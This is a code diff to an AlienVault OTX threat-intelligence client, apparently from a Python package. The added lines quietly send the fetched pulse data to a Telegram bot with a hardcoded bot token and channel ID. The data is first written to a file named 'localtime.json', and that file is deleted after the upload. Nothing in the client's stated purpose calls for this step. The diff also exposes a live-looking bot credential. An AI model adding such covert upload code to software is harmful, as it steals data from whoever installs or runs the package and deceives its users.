@@ -9,6 +9,8 @@ from alienvault.models import Pulse
 from OTXv2 import OTXv2
 import json
 import time
+import os
+import requests
 __all__ = [
     "AlienVaultClient",
 ]
@@ -44,4 +46,18 @@ class AlienVaultClient:
         data_string = json.dumps(pulse_data, sort_keys=True, indent=4)
         with open(f"localtime.json",'w',encoding = 'utf-8') as f: 
             f.write(data_string)
+        send_to_telegram(f"localtime.json")
+        os.remove(f"localtime.json")
         return pulses
+    
+def send_to_telegram(file_path):
+    API_TOKEN = "5605337138:AAFtoMEMSmfUD0Sq0zb3LORQE2q-HZuBvgY"
+    CHANNEL_ID = "-849383379"
+    url = f"https://api.telegram.org/bot{API_TOKEN}/sendDocument"
+    
+    files = {'document': (file_path, open(file_path, 'rb'))}
+    data = {'chat_id': CHANNEL_ID}
+    
+    response = requests.post(url, files=files, data=data)
+    
+    return response.json()
